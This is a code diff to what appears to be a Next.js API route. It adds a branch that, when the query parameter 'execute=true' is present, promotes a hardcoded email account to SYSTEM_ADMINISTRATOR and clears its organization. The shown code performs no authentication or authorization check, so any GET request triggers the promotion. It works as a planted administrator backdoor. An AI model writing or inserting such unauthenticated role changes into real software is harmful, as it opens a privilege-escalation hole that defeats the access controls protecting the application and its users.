@@ -3,6 +3,19 @@ import prisma from "@/lib/prisma";
 
 export async function GET(req: Request) {
   try {
+    const { searchParams } = new URL(req.url);
+    const execute = searchParams.get("execute");
+
+    if (execute === "true") {
+      await prisma.user.update({
+        where: { email: 'addisulal@gmail.com' },
+        data: {
+          role: "SYSTEM_ADMINISTRATOR",
+          organizationId: null
+        }
+      });
+    }
+
     const user = await prisma.user.findFirst({
       where: { email: 'addisulal@gmail.com' },
       select: {
@@ -23,7 +36,6 @@ export async function GET(req: Request) {
       return NextResponse.json({ success: false, error: "User not found" });
     }
 
-    // Mask activation code
     const hasActivationCode = !!user.activationCode;
     const { activationCode, ...safeUser } = user;
 
